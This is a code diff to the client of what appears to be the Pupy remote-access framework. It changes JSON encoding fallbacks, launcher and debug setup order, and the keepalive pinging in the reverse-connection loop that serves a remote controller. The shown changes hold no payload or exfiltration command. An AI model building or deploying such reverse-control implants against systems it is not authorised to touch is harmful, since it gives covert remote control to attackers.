@@ -59,6 +59,7 @@ import argparse
 from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
+from network.lib.streams.PupySocketStream import PupyChannel
 import logging
 import shlex
 import marshal
@@ -216,7 +217,23 @@ class ReverseSlaveService(Service):
         return __import__(name, None, None, "*")
 
     def exposed_json_dumps(self, obj, compressed=False):
-        data = json.dumps(obj, ensure_ascii=False)
+        try:
+            data = json.dumps(obj, ensure_ascii=False)
+        except:
+            try:
+                import locale
+                data = json.dumps(
+                    obj,
+                    ensure_ascii=False,
+                    encoding=locale.getpreferredencoding()
+                )
+            except:
+                data = json.dumps(
+                    obj,
+                    ensure_ascii=False,
+                    encoding='latin1'
+                )
+
         if compressed:
             if type(data) == unicode:
                 data = data.encode('utf-8')
@@ -299,14 +316,8 @@ def main():
         if not debug:
             debug = bool(args.debug)
 
-        if debug:
-            logging.getLogger().setLevel(logging.DEBUG)
-
         LAUNCHER = args.launcher
         LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))
-
-    if LAUNCHER not in conf.launchers:
-        exit("No such launcher: %s" % LAUNCHER)
 
     if hasattr(pupy, 'get_pupy_config'):
         try:
@@ -315,6 +326,12 @@ def main():
         except ImportError, e:
             logging.warning(
                 "ImportError: Couldn't load pupy config: {}".format(e))
+
+    if LAUNCHER not in conf.launchers:
+        exit("No such launcher: %s" % LAUNCHER)
+
+    if debug:
+        logging.getLogger().setLevel(logging.DEBUG)
 
     launcher = conf.launchers[LAUNCHER]()
     try:
@@ -333,6 +350,7 @@ def main():
     pupy.infos['transport'] = launcher.get_transport()
     pupy.infos['debug'] = debug
     pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
+    pupy.infos['revision'] = getattr(pupy, 'revision', None)
 
     exited = False
 
@@ -399,7 +417,7 @@ def rpyc_loop(launcher):
                 try:
                     conn = PupyConnection(
                         lock, None, ReverseSlaveService,
-                        rpyc.Channel(stream), config={}
+                        PupyChannel(stream), config={}
                     )
                     conn._init_service()
                 finally:
@@ -408,7 +426,10 @@ def rpyc_loop(launcher):
                 attempt = 0
                 with lock:
                     while not conn.closed:
-                        conn.serve(10)
+                        interval, timeout = conn.get_pings()
+                        conn.serve(interval or 10)
+                        if interval:
+                            conn.ping(timeout)
 
         except SystemExit:
             raise
